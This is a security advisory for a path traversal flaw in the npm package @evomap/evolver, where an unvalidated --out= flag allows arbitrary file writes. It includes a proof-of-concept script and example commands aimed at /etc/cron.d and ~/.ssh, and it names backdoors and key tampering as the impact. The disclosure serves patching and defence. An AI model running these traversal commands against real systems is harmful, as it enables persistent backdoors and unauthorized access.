# [H] Evolver: Path Traversal via `--out` flag in `fetch` command allows Arbitrary File Write

## Summary
Severity: High
Advisory: GHSA-r466-rxw4-3j9j
CVE: CVE-2026-42075
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-r466-rxw4-3j9j
Type: github-advisory

## Affected
- npm: `@evomap/evolver` — affected >=0 <1.69.3

## Details
### Summary
A path traversal vulnerability in the skill download (`fetch`) command allows attackers to write files to arbitrary locations on the filesystem. The `--out=` flag accepts user-provided paths without validation, enabling directory traversal attacks that can overwrite critical system files or create files in sensitive locations.

### Details
The vulnerability exists in `index.js` at lines 752-767:

```javascript
// index.js:751-768
const outFlag = args.find(a => typeof a === 'string' && a.startsWith('--out='));
const safeId = String(data.skill_id || skillId).replace(/[^a-zA-Z0-9_\-\.]/g, '_');

// VULNERABLE: No path validation on user input
const outDir = outFlag
  ? outFlag.slice('--out='.length)  // User-controlled path
  : path.join('.', 'skills', safeId);

if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

// ... downloads skill files to outDir
```

The `outFlag.slice('--out='.length)` extracts the user-provided path without any sanitization or validation. An attacker can provide paths like `../../../etc/cron.d` to write files outside the intended directory.

Note: The `safeId` variable is sanitized via inline replacement (`replace(/[^a-zA-Z0-9_\-\.]/g, '_')`), but this sanitization only applies to the default path, not to the user-provided `--out=` path.

### PoC

**Prerequisites:**
- Node.js installed
- Access to the evolver application

**Steps to reproduce:**

1. Create a test file demonstrating the vulnerability:

```javascript
// test-file-write.js
const fs = require('fs');
const path = require('path');

// Simulate the vulnerable fetchSkill logic
function vulnerableFetchSkill(outFlag) {
  const outDir = outFlag
    ? outFlag.slice('--out='.length)  // No validation!
    : path.join('.', 'skills', 'default');
  
  console.log('Target directory:', outDir);
  console.log('Resolved path:', path.resolve(outDir));
  
  // In real code, this would write skill files
  const targetFile = path.join(outDir, 'skill.js');
  console.log('Would write to:', targetFile);
  
  return { outDir, targetFile };
}

// Test cases
console.log('=== Test 1: Normal path ===');
vulnerableFetchSkill('--out=./my-skills/test');

console.log('\n=== Test 2: Path traversal ===');
const result = vulnerableFetchSkill('--out=../../../tmp/evolver-test');

// Actually demonstrate the vulnerability
console.log('\n=== Creating directory to prove traversal works ===');
try {
  if (!fs.existsSync(result.outDir)) {
    fs.mkdirSync(result.outDir, { recursive: true });
  }
  fs.writeFileSync(
    path.join(result.outDir, 'poc.txt'),
    'Path traversal successful!\nThis file was written outside the intended directory.'
  );
  console.log('SUCCESS: File written to:', path.resolve(result.targetFile));
} catch (e) {
  console.log('Error:', e.message);
}
```

2. Run the test:
```bash
node test-file-write.js
```

**Expected output:**
```
=== Test 2: Path traversal ===
Target directory: ../../../tmp/evolver-test
Resolved path: /tmp/evolver-test
Would write to: ../../../tmp/evolver-test/skill.js

=== Creating directory to prove traversal works ===
SUCCESS: File written to: /tmp/evolver-test/poc.txt
```

**Actual exploit scenario:**
An attacker can run:
```bash
# Write to system cron directory (requires appropriate permissions)
node index.js fetch malicious-skill --out=../../../etc/cron.d

# Or overwrite existing files
node index.js fetch existing-skill --out=../../../home/user/.ssh
```

### Impact
This is an **Arbitrary File Write** vulnerability that can lead to:
- Overwriting critical system files
- Installing persistent backdoors (e.g., in cron directories)
- Modifying SSH authorized_keys
- Overwriting application code or configuration files
- Privilege escalation if the process runs with elevated privileges

**Affected users:** Anyone using the `fetch` command with the `--out=` flag, especially in automated environments or CI/CD pipelines.

## References
- https://github.com/EvoMap/evolver/security/advisories/GHSA-r466-rxw4-3j9j
- https://nvd.nist.gov/vuln/detail/CVE-2026-42075
- https://github.com/EvoMap/evolver
- https://github.com/EvoMap/evolver/releases/tag/v1.69.3
